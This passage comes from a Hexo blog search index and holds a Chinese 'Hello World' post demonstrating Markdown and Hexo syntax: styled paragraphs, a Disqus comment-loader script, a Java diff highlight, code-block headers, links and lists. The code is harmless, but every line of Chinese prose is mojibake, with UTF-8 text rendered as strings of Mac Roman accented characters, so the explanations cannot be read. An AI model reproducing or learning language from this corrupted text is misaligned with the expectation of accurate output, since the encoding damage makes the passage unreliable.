id=&quot;div-border-top-blue&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-top-purple&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-left-red&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-left-yellow&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-left-green&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-left-blue&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-left-purple&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-right-red&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-right-yellow&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-right-green&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-right-blue&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-right-purple&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt; Ëã±ÊñáÂúàËµ∑Êù•ÁöÑÊ†∑ÂºèÂúàÂúàÂúÜÂúÜ1`ÂúàÂúàÂúÜÂúÜ` ÊèíÂÖ•‰ª£Á†Å12345678910111213var disqus = &#123; load : function disqus()&#123; if(typeof DISQUS !== 'object') &#123; (function () &#123; var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); &#125;()); $('#load-disqus').html("ËØÑËÆ∫Âä†ËΩΩ‰∏≠, ËØ∑Á°Æ‰øù‰Ω†ÊúâÊ¢ØÂ≠ê, Ëã•ËØÑËÆ∫ÈïøÊó∂Èó¥Êú™Âä†ËΩΩÂàô‰Ω†ÂèØËÉΩÁøªÂ¢ôÂ§±Ë¥•...").fadeOut(9000); //Âä†ËΩΩÂêéÁßªÈô§ÊåâÈíÆ &#125; &#125;&#125; 1‰ΩøÁî®```ÔºàÁªìÂ∞æËøòÊúâ‰∏Ä‰∏™Ôºâjavascript ÂõæÁâá1![](https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/Hello-World/header_background.jpg) ‰ª£Á†ÅÈ´ò‰∫ÆHello WorldÁ§∫‰æãËøôÊòØÈìæÊé•1234 public static void main(String[] args) &#123;+ System.out.println("Hello World!");- System.out.println("Hello World!"); &#125; Ê≠£Á°ÆÂßøÂäø, ‰ª£Á†ÅÁâáÊÆµÂºÄÂ§¥:1[language] [title] [url] [link-text] [language] ÊòØ‰ª£Á†ÅËØ≠Ë®ÄÁöÑÂêçÁß∞, Áî®Êù•ËÆæÁΩÆ‰ª£Á†ÅÂùóÈ¢úËâ≤È´ò‰∫Æ, ÈùûÂøÖÈ°ªÔºõ [title] ÊòØÈ°∂ÈÉ®Â∑¶ËæπÁöÑËØ¥Êòé, ÈùûÂøÖÈ°ªÔºõ [url] ÊòØÈ°∂ÈÉ®Âè≥ËæπÁöÑË∂ÖÈìæÊé•Âú∞ÂùÄ, ÈùûÂøÖÈ°ªÔºõ [link text] Â¶ÇÂÆÉÁöÑÂ≠óÈù¢ÊÑèÊÄù, Ë∂ÖÈìæÊé•ÁöÑÂêçÁß∞, ÈùûÂøÖÈ°ª. Ëøô 4 È°πÂ∫îËØ•ÊòØÊ†πÊçÆÁ©∫Ê†ºÊù•ÂàÜÈöî, ËÄå‰∏çÊòØ[], ÊïÖËØ∑‰∏çË¶ÅÂä†[]. Èô§ÈùûÂ¶ÇÊûú‰Ω†ÊÉ≥ÂÜôÂêéÈù¢‰∏§‰∏™, ‰ΩÜ‰∏çÊÉ≥ÂÜôÂâçÈù¢‰∏§‰∏™, ÈÇ£‰πàÂ∞±ÂøÖÈ°ªÂä†[]‰∫Ü, Ë¶ÅËøôÊ†∑ÂÜô: [] [] [url] [link text]. ÈìæÊé•https://hitcxy.com1[https://hitcxy.com](https://hitcxy.com) Êó†Â∫èÂàóË°® Ê≤°ÊúâÈ°∫Â∫è1 Ê≤°ÊúâÈ°∫Â∫è2 Ê≤°ÊúâÈ°∫Â∫è3123- Ê≤°ÊúâÈ°∫Â∫è1- Ê≤°ÊúâÈ°∫Â∫è2- Ê≤°ÊúâÈ°∫Â∫è3 ÈìæÊé•+ÂàóË°® ÁôæÂ∫¶Êèê‰∫§ÂÖ•Âè£ GoogleÊèê‰∫§ÂÖ•Âè£ 360Êèê‰∫§ÂÖ•Âè£123* ***[ÁôæÂ∫¶Êèê‰∫§ÂÖ•Âè£](http://zhanzhang.baidu.com/linksubmit/url)**** ***[GoogleÊèê‰∫§ÂÖ•Âè£](https://www.google.com/webmasters/tools/home?hl=zh-CN)**** ***[360Êèê‰∫§ÂÖ•Âè£](http://info.so.360.cn/site_submit.html)*** Êñú‰Ωì‰Ω†ÁúãÊàëÊñú‰∏çÊñú1*‰Ω†ÁúãÊàëÊñú‰∏çÊñú* Âº∫Ë∞É‰Ω†ÁúãÊàëÈáç‰∏çÈáçË¶Å1**‰Ω†ÁúãÊàëÈáç‰∏çÈáçË¶Å** ÂèÇËÄÉ ÂèÇËÄÉhttp://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/123&gt; **ÂèÇËÄÉ**&gt; ***[http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/](http://codepub.cn/2015/04/06/Github-Pages-personal-blog-from-Octopress-to-Hexo/)***&gt; ***[http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/](http://codepub.cn/2016/03/20/Hexo-blog-theme-switching-from-Jacman-to-NexT-Mist/)*** Â•ΩÁúãÁöÑÁ¨¶Âè∑„ÄåÂï¶Âï¶Âï¶„ÄçÂ∞±ÂÉèËøôÊ†∑‚Üì]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hello</tag>
        <tag>Grammar</tag>
      </tags>
  </entry>
</search>
